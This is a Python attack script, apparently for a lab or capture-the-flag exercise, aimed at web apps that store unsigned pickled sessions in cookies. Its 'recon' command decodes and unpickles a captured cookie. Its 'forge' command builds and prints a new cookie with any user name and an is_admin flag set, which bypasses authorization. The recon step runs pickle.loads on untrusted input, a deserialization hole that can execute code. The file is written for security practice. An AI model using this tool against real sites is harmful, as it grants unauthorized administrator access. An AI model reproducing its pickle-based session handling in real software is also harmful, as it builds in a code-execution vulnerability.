import base64
import pickle
import argparse


def encode_session(obj: dict) -> str:
    raw = pickle.dumps(obj)
    return base64.urlsafe_b64encode(raw).decode("utf-8")


def decode_session(cookie_value: str):
    raw = base64.urlsafe_b64decode(cookie_value)
    return pickle.loads(raw)


def recon(cookie_value: str):
    obj = decode_session(cookie_value)

    print("\nDecoded session object:")
    print(obj)

    print("\nDiscovered fields:")
    for key, value in obj.items():
        print(f"{key} = {value}")


def forge(user: str, is_admin: bool):
    forged = {
        "user": user,
        "is_admin": is_admin
    }

    cookie_value = encode_session(forged)

    print(cookie_value)


def main():
    parser = argparse.ArgumentParser()
    subparsers = parser.add_subparsers(dest="command", required=True)

    # Recon command
    recon_parser = subparsers.add_parser("recon")
    recon_parser.add_argument("--cookie", required=True)

    # Forge command
    forge_parser = subparsers.add_parser("forge")
    forge_parser.add_argument("--user", default="alice")
    forge_parser.add_argument("--admin", action="store_true")

    args = parser.parse_args()

    if args.command == "recon":
        recon(args.cookie)

    elif args.command == "forge":
        forge(args.user, args.admin)


if __name__ == "__main__":
    main()
